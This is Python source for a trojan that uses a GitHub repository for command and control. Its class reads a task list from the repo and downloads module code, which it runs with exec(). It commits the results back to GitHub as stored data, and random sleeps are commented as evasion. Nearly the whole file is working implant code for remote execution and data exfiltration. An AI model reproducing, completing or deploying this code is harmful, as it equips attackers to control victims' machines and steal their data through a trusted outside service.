#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Oct 28 17:47:17 2021

@author: xcs
"""
#THREADING IMPLEMENTATION

import gitwrapper
import json
import sys
import datetime
import types
from queue import Queue
import threading
import time
import random

#configuration path
cpath="config/"
#module path
mpath="modules/"
#data path
dpath="data/"
lock=threading.Lock()
class Konopss :
    def __init__(self,konopsid):
        #Konops id
        self.konops_id=konopsid
        #Konops modules
        self.konops_modules=[]
        self.q=Queue()
        #Is it configured?
        self.configured=False
        #Configuration file 
        self.konops_config="%s.json"%self.konops_id
        
        #Holded data
        self.data=dict()
        self.result=""
        
        #Initialize tokens and headers
        
        self.token,self.headers=gitwrapper.login()
        

    def configure(self): #WORKS AS INTENDED
        #Read configuration file
        path_filename=cpath+self.konops_config
        resp,config_content=gitwrapper.get_file_contents(self.token,self.headers,path_filename)
    
        #Storing the configurations~modules to variables to access them
        config=json.loads(config_content)
        for task in config:
            self.konops_modules.append(task['module'])
        #Setting our troj as configured
        self.configured=True
        return config #optional , helpful for debugging
    
    def execute(self):
        #Read modules
        for task in self.konops_modules:
            modulename=task
            filename=modulename+".py"
            filepathname=mpath+filename
            #Get module file content // Load modules
            resp,content=gitwrapper.get_file_contents(self.token,self.headers,filepathname)
    
            #Create types module and execute it
            module = types.ModuleType(modulename)
            exec(content, module.__dict__)
            sys.modules[modulename] = module
            self.q.put(1)
            self.result = sys.modules[modulename].run()
            self.q.get()
            with lock:
                #Data~results
                self.data[modulename]=str(self.result)
                #Store data~results
                self.savedata(self.data)
                time.sleep(random.randint(1,10)) #Sleep to avoid evasion
            time.sleep(random.randint(1000,100000))#Sleep to avoid evasion
    
    #PROBLEMS WITH THREAD MANAGEMENT    
    def Initiate(self): #Contatins threaded execution and stores results
        if self.configured:
            while True:
                if(self.q.empty()):
                    #Implementing Threading
                    t=threading.Thread(target=self.execute)
                    t.daemon=True
                    t.start()
        else:
            self.configure()
            #Printing results
            #print("result of "+filename+" is: '" + str(result) + "'")
            
            
        
    def savedata(self,data):   
        #Storing data~results
        time = str(datetime.datetime.now())
        datapathfile=dpath+self.konops_id+time+".txt"
    
        commit="Stored "+self.konops_id+" work to data..."
        
        content=json.dumps(data)
        #Store the data to a file in github
        gitwrapper.store_to_file(self.token,self.headers,datapathfile,commit,content)
        #print(resp2) #always print responses to identify the bugs during debugging.They print errors. 
        
    